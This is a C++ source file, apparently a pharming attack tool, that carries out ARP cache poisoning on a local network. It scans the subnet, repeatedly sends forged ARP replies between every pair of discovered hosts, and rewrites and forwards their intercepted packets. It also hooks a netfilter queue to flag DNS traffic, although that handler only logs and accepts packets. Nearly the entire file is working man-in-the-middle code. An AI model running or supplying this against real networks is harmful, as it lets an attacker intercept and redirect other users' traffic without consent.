#include "pharm_attack.hpp"

// #define INFO 1

void parseARPReply(uint8_t *buffer, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, struct LocalInfo local_info) {
    arp_hdr *arphdr = (arp_hdr *)(buffer + ETH_HDRLEN);

    // Check if ARP packet is a response
    if (ntohs(arphdr->opcode) == ARPOP_REPLY) {
        // If the IP address is the gateway IP, return
        if (arphdr->sender_ip[0] == (local_info.gateway_ip.sin_addr.s_addr & 0xff) &&
            arphdr->sender_ip[1] == ((local_info.gateway_ip.sin_addr.s_addr >> 8) & 0xff) &&
            arphdr->sender_ip[2] == ((local_info.gateway_ip.sin_addr.s_addr >> 16) & 0xff) &&
            arphdr->sender_ip[3] == ((local_info.gateway_ip.sin_addr.s_addr >> 24) & 0xff)) {
            ip_mac_pairs[arphdr->sender_ip] = arphdr->sender_mac;
            return;
        }

        // If the IP address is local IP, return
        if (arphdr->sender_ip[0] == (local_info.src_ip.sin_addr.s_addr & 0xff) &&
            arphdr->sender_ip[1] == ((local_info.src_ip.sin_addr.s_addr >> 8) & 0xff) &&
            arphdr->sender_ip[2] == ((local_info.src_ip.sin_addr.s_addr >> 16) & 0xff) &&
            arphdr->sender_ip[3] == ((local_info.src_ip.sin_addr.s_addr >> 24) & 0xff)) {
            return;
        }

        // If the IP address has already in the ip_mac_pairs, return
        if (ip_mac_pairs.find(arphdr->sender_ip) != ip_mac_pairs.end()) {
            return;
        }
        // Save IP-MAC pair
        ip_mac_pairs[arphdr->sender_ip] = arphdr->sender_mac;

        // Print source IP address
        printf("%d.%d.%d.%d\t\t", arphdr->sender_ip[0], arphdr->sender_ip[1], arphdr->sender_ip[2], arphdr->sender_ip[3]);
        // Print source MAC address
        for (int i = 0; i < 5; i++) {
            printf("%02x:", arphdr->sender_mac[i]);
        }
        printf("%02x\n", arphdr->sender_mac[5]);
    }
}

bool modifyPacket(uint8_t *buffer, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, struct LocalInfo local_info) {
    // Get the Ethernet header
    struct ethhdr *eth = (struct ethhdr *)buffer;

    // Get the IP header
    struct iphdr *iph = (struct iphdr *)(buffer + ETH_HDRLEN);

    bool modified = false;

    // Change the source MAC to my MAC
    memcpy(eth->h_source, local_info.src_mac.data(), ETH_ALEN);

    // If the destination IP is not in the map, change the destination MAC to the gateway's MAC
    if (ip_mac_pairs.find({(uint8_t)(iph->daddr & 0xff), (uint8_t)((iph->daddr >> 8) & 0xff), (uint8_t)((iph->daddr >> 16) & 0xff), (uint8_t)((iph->daddr >> 24) & 0xff)}) == ip_mac_pairs.end()) {
        // Find the MAC address for the gateway IP
        std::array<uint8_t, 4> gateway_ip_addr = {(uint8_t)(local_info.gateway_ip.sin_addr.s_addr & 0xff), (uint8_t)((local_info.gateway_ip.sin_addr.s_addr >> 8) & 0xff), (uint8_t)((local_info.gateway_ip.sin_addr.s_addr >> 16) & 0xff), (uint8_t)((local_info.gateway_ip.sin_addr.s_addr >> 24) & 0xff)};
        std::array<uint8_t, 6> &gateway_mac = ip_mac_pairs[gateway_ip_addr];
        memcpy(eth->h_dest, gateway_mac.data(), ETH_ALEN);
        modified = true;
    }
    // If the destination MAC is my_mac and the IP is not my IP, change the destination MAC to the IP's MAC
    if (memcmp(eth->h_dest, local_info.src_mac.data(), ETH_ALEN) != 0 && iph->daddr != local_info.src_ip.sin_addr.s_addr && !modified) {
        // Find the MAC address for the destination IP
        std::array<uint8_t, 4> dest_ip_addr;
        memcpy(dest_ip_addr.data(), &iph->daddr, 4);
        std::array<uint8_t, 6> &dest_mac = ip_mac_pairs[dest_ip_addr];
        memcpy(eth->h_dest, dest_mac.data(), ETH_ALEN);
        modified = true;
    }
    return modified;
}

void sendMarkedPacket(uint8_t *buffer, int bytes, int sd, struct LocalInfo local_info) {
    // Get the payload
    uint8_t *payload = buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr);
    int payload_length = bytes - (ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr));

    int chunk_size = 1024;  // Size of each chunk
    int total_sent = 0;     // Total amount of data sent
    while (total_sent < bytes) {
        int to_send = std::min(chunk_size, bytes - total_sent);
        if (sendto(sd, buffer + total_sent, to_send, 0, (struct sockaddr *)&local_info.device, sizeof(local_info.device)) <= 0) {
            perror("sendto() failed (Packet)");
            exit(EXIT_FAILURE);
        }
        total_sent += to_send;
    }
}

// Function to handle receiving responses
void receiveHandler(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, struct LocalInfo local_info) {
    uint8_t buffer[IP_MAXPACKET];
    struct sockaddr saddr;
    int saddr_len = sizeof(saddr);

    int val = 1;
    if (setsockopt(sd, SOL_SOCKET, SO_MARK, &val, sizeof(val)) < 0) {
        perror("setsockopt() failed");
        exit(EXIT_FAILURE);
    }

    while (true) {
        // Receive packet
        int bytes = recvfrom(sd, buffer, IP_MAXPACKET, 0, &saddr, (socklen_t *)&saddr_len);
        if (bytes < 0) {
            perror("recvfrom() failed");
            exit(EXIT_FAILURE);
        }

        // Check if packet is an ARP packet
        if (buffer[12] == ETH_P_ARP / 256 && buffer[13] == ETH_P_ARP % 256) {
            parseARPReply(buffer, ip_mac_pairs, local_info);
            continue;
        }
        // Check if packet is an IP packet
        if (bytes < ETH_HDRLEN + sizeof(struct iphdr)) {
            continue;  // Not enough data for IP header
        }
        struct iphdr *iph = (struct iphdr *)(buffer + ETH_HDRLEN);  // Skip the Ethernet header
        if (iph->daddr == htonl(0x7f000001) || iph->saddr == htonl(0x7f000001)) {
            continue;
        }

        modifyPacket(buffer, ip_mac_pairs, local_info);

        sendMarkedPacket(buffer, bytes, sd, local_info);

        memset(buffer, 0, IP_MAXPACKET);
    }
}

// Function to send fake ARP replies
void sendSpoofedARPReply(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, struct LocalInfo local_info) {
    arp_hdr arphdr;
    arphdr.htype = htons(1);                    // Hardware type (16 bits): 1 for ethernet
    arphdr.ptype = htons(ETH_P_IP);             // Protocol type (16 bits): 2048 for IP
    arphdr.hlen = 6;                            // Hardware address length (8 bits): 6 bytes for MAC address
    arphdr.plen = 4;                            // Protocol address length (8 bits): 4 bytes for IPv4 address
    arphdr.opcode = htons(ARPOP_REPLY);         // OpCode: 2 for ARP reply
    int frame_length = 6 + 6 + 2 + ARP_HDRLEN;  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)
    std::array<uint8_t, IP_MAXPACKET> ether_frame;

    ether_frame[12] = ETH_P_ARP / 256;
    ether_frame[13] = ETH_P_ARP % 256;
    while (true) {
        for (auto it_i = ip_mac_pairs.begin(); it_i != ip_mac_pairs.end(); ++it_i) {
            for (auto it_j = ip_mac_pairs.begin(); it_j != ip_mac_pairs.end(); ++it_j) {
                if (it_i == it_j) continue;  // Skip sending to self

                // Construct and send fake ARP reply
                std::copy(local_info.src_mac.begin(), local_info.src_mac.end(), arphdr.sender_mac.begin());  // Sender hardware address (48 bits): MAC address
                std::copy(it_j->first.begin(), it_j->first.end(), arphdr.sender_ip.begin());                 // Sender protocol address (32 bits): IP of another pair
                std::copy(it_i->second.begin(), it_i->second.end(), arphdr.target_mac.begin());              // Target hardware address (48 bits): MAC address of current pair
                std::copy(it_i->first.begin(), it_i->first.end(), arphdr.target_ip.begin());                 // Target protocol address (32 bits): IP of current pair

                // Destination and Source MAC addresses
                std::copy(it_i->second.begin(), it_i->second.end(), ether_frame.begin());
                std::copy(local_info.src_mac.begin(), local_info.src_mac.end(), ether_frame.begin() + 6);

                // ARP header
                memcpy(ether_frame.data() + ETH_HDRLEN, &arphdr, ARP_HDRLEN * sizeof(uint8_t));

                // Send ethernet frame to socket.
                if (sendto(sd, ether_frame.data(), frame_length, 0, (struct sockaddr *)&local_info.device, sizeof(local_info.device)) <= 0) {
                    perror("sendto() failed");
                    exit(EXIT_FAILURE);
                }
            }
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));  // Sleep for a while
    }
}

// Function to send ARP request
void sendARPRequest(int sd, struct LocalInfo local_info) {
    int frame_length;
    int bytes;
    arp_hdr arphdr;
    std::array<uint8_t, 6> dst_mac;
    std::array<uint8_t, IP_MAXPACKET> ether_frame;
    // Set destination MAC address: broadcast address
    std::fill(dst_mac.begin(), dst_mac.end(), 0xff);

    // Copy IP address from sockaddr_in to sender_ip
    std::copy_n(reinterpret_cast<uint8_t *>(&local_info.src_ip.sin_addr.s_addr), 4, arphdr.sender_ip.begin());

    // Fill out sockaddr_ll.
    local_info.device.sll_family = AF_PACKET;
    std::copy(local_info.src_mac.begin(), local_info.src_mac.end(), local_info.device.sll_addr);
    local_info.device.sll_halen = htons(6);

    // ARP header
    arphdr.htype = htons(1);                                                                     // Hardware type (16 bits): 1 for ethernet
    arphdr.ptype = htons(ETH_P_IP);                                                              // Protocol type (16 bits): 2048 for IP
    arphdr.hlen = 6;                                                                             // Hardware address length (8 bits): 6 bytes for MAC address
    arphdr.plen = 4;                                                                             // Protocol address length (8 bits): 4 bytes for IPv4 address
    arphdr.opcode = htons(ARPOP_REQUEST);                                                        // OpCode: 1 for ARP request
    std::copy(local_info.src_mac.begin(), local_info.src_mac.end(), arphdr.sender_mac.begin());  // Sender hardware address (48 bits): MAC address
    arphdr.target_mac.fill(0);                                                                   // Target hardware address (48 bits): zero

    // Fill out ethernet frame header.
    frame_length = 6 + 6 + 2 + ARP_HDRLEN;  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)

    // Destination and Source MAC addresses
    std::copy(dst_mac.begin(), dst_mac.end(), ether_frame.begin());
    std::copy(local_info.src_mac.begin(), local_info.src_mac.end(), ether_frame.begin() + 6);

    // Ethernet type code (ETH_P_ARP for ARP).
    // http://www.iana.org/assignments/ethernet-numbers
    ether_frame[12] = ETH_P_ARP / 256;
    ether_frame[13] = ETH_P_ARP % 256;
    uint32_t base_ip_net = ntohl(local_info.src_ip.sin_addr.s_addr) & ntohl(local_info.netmask.sin_addr.s_addr);
    uint32_t mask_net = ntohl(~local_info.netmask.sin_addr.s_addr);

    for (uint32_t i = 1; i < mask_net; i++) {
        uint32_t dest_ip = htonl(base_ip_net | i);

        std::copy_n(reinterpret_cast<uint8_t *>(&dest_ip), 4, arphdr.target_ip.begin());
        // ARP header
        memcpy(ether_frame.data() + ETH_HDRLEN, &arphdr, ARP_HDRLEN * sizeof(uint8_t));
        // Send ethernet frame to socket.
        if ((bytes = sendto(sd, ether_frame.data(), frame_length, 0, (struct sockaddr *)&local_info.device, sizeof(local_info.device))) <= 0) {
            perror("sendto() failed");
            exit(EXIT_FAILURE);
        }
    }
}

static int handleNFQPacket(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
                           struct nfq_data *nfa, void *data) {
    struct nfqnl_msg_packet_hdr *ph;
    struct nfqnl_msg_packet_hw *hwph;
    u_int32_t id = 0;
    ph = nfq_get_msg_packet_hdr(nfa);
    if (ph) {
        id = ntohl(ph->packet_id);
    }
    unsigned char *packet;
    int len = nfq_get_payload(nfa, &packet);
    if (len >= 0) {
        printf("Received packet with length %d\n", len);
        // Parse the packet
        struct iphdr *iph = (struct iphdr *)packet;
        if (iph->protocol == IPPROTO_UDP) {
            struct udphdr *udph = (struct udphdr *)(packet + iph->ihl * 4);

            // Check if the destination port is 53 (DNS Packet)
            if (ntohs(udph->dest) == 53) {
                printf("DNS Packet\n");
            }
        }
    } else {
        printf("Error: nfq_get_payload returned %d\n", len);
    }
    return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
}

void NFQHandler() {
    struct nfq_handle *h;
    struct nfq_q_handle *qh;
    struct nfnl_handle *nh;
    int fd;
    int rv;
    char buf[4096] __attribute__((aligned));

    h = nfq_open();
    if (!h) {
        fprintf(stderr, "error during nfq_open()\n");
        exit(1);
    }
    if (nfq_unbind_pf(h, AF_INET) < 0) {
        fprintf(stderr, "error during nfq_unbind_pf()\n");
        exit(1);
    }
    if (nfq_bind_pf(h, AF_INET) < 0) {
        fprintf(stderr, "error during nfq_bind_pf()\n");
        exit(1);
    }
    qh = nfq_create_queue(h, 0, &handleNFQPacket, NULL);
    if (!qh) {
        fprintf(stderr, "error during nfq_create_queue()\n");
        exit(1);
    }
    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
        fprintf(stderr, "can't set packet_copy mode\n");
        exit(1);
    }
    fd = nfq_fd(h);
    while ((rv = recv(fd, buf, sizeof(buf), 0)) && rv >= 0) {
        nfq_handle_packet(h, buf, rv);
    }
    nfq_destroy_queue(qh);
    nfq_close(h);
}

int main(int argc, char **argv) {
    char *interface;
    struct ifreq ifr;
    int sd;

    struct LocalInfo local_info;

    if (argc != 2) {
        printf("Usage: %s <interface>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Interface to send packet through.
    interface = argv[1];

    // Get source IP address.
    getSourceIP(interface, local_info.src_ip);

    // Get source MAC address.
    getMACAddress(interface, local_info.src_mac);

    // Get netmask.
    getMask(interface, local_info.netmask);

    // Get default gateway.
    getDefaultGateway(interface, local_info.gateway_ip);

    // Find interface index from interface name and store index in
    // struct sockaddr_ll device, which will be used as an argument of sendto().
    if ((local_info.device.sll_ifindex = if_nametoindex(interface)) == 0) {
        perror("if_nametoindex() failed to obtain interface index");
        exit(EXIT_FAILURE);
    }
#ifdef INFO
    printf("src_ip: %s\n", inet_ntoa(local_info.src_ip.sin_addr));
    printf("src_mac: %02x:%02x:%02x:%02x:%02x:%02x\n", local_info.src_mac[0], local_info.src_mac[1], local_info.src_mac[2], local_info.src_mac[3], local_info.src_mac[4], local_info.src_mac[5]);
    printf("netmask: %s\n", inet_ntoa(local_info.netmask.sin_addr));
    printf("Index for interface %s is %i\n", interface, local_info.device.sll_ifindex);
    printf("gateway_ip: %s\n", inet_ntoa(local_info.gateway_ip.sin_addr));
#endif

    // Submit request for a raw socket descriptor.
    if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        perror("socket() failed");
        exit(EXIT_FAILURE);
    }

    sendARPRequest(sd, local_info);

    // Use a table to save IP-MAC pairs
    std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> ip_mac_pairs;

    printf("Available devices\n");
    printf("-----------------------------------------\n");
    printf("IP\t\t\tMAC\n");
    printf("-----------------------------------------\n");

    // Start the threads
    std::thread send_thread(sendSpoofedARPReply, sd, std::ref(ip_mac_pairs), local_info);
    std::thread receive_thread(receiveHandler, sd, std::ref(ip_mac_pairs), local_info);

    // Start the NFQHandler
    std::thread nfq_thread(NFQHandler);

    // Wait for threads to finish
    send_thread.join();
    receive_thread.join();
    nfq_thread.join();

    // Close socket descriptor.
    close(sd);

    return (EXIT_SUCCESS);
}